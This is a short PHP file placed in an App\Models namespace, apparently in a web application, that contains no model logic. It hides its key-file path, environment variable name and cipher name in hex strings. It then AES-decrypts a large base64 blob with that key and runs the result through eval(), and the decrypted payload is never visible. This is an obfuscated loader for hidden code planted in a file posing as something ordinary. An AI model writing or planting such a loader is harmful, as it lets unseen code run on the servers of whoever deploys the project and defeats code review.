<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('9rdUEn5M0BjVbPZJ702SvQ==');

$c=base64_decode(

'RJrMhDVUGy+14cu1w98RKJbnsPLhFq3le5tt3zzl44vYOYZRLw5jL71LawMO3IlWw/YOa15uFx4R' .
'WI/0PxC+6WpdBUFNAq1wFO8Sjw7FeQ1lVJ8FvcQtRpaGCt28vpOKAyBPSoiyQUnFOTQpc/Vmk5jn' .
'Re/Vw/Ipez9ElfFurCx/xbkODRVWr8Axx1x/j7uFciq+HJx+xCW5Jvnfrx/3ASpbNt7h/3KSkuMh' .
'SMCkMSAycPkCiIFH9/MGruv+82E1WFpfyRgcerd0vJ7sxovJyzDigHFrNWCjL7/kQifBQLh6Gai/' .
'o3a55KFbMXdcHm9cETd5B71C0lJU6q2LGYk2r5va8frVN5fFvCJcG1Nw4qebQVmVJXcSw1tu6ZA9' .
'dfh95ED0Qoy5IDpT9xCWJ9gclq+8WsZI+5DSuNsrpQIk7FASs4Vt+DRVRDO/sYL5AmALbX4fzfbY' .
'2rA0KG9mH65Nnkh2qz7X+Q/kh3abdUkOz7cyxI8aUpcIp3y0mg/4VHTrBk3Dvpz/3vJzL27gG9NT' .
'CXqZVSDwKsWAHhfGoMvAuo+zsaBns4HSnvzvNSO/ztWptnuA8Wiygn2HIIXdBzCilvzCti3F+vnk' .
'bEoT+8OsLPrMmT5mJXoAgN9Gfe+uxM446+mxJvFdKkX5v//iBBdBjtxXg5nqC1fhAN+PxprzZ5LW' .
'F3rzgx80KEaWf+P0VwMBgXJU6tgWl+xOTfbJh/XJUdXlShStfUH+EPwmGGiS4r8WqJxDURU5WcP1' .
'1p5Ou+p4XPou5hJYTr7Fr9Z+HYiJcbDrQ+DsJp6q9L3Mq27vNIGFIrw9dM58VHDwvCwaVhP9faMs' .
'vxhjcKIn5UZl2Df4OQT6tBPMPF6u0h5R+scuL2Kc6T6FfdY3tO5nPRwDD84SBvclrEEIL/7xNjkZ' .
'poG8Jw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

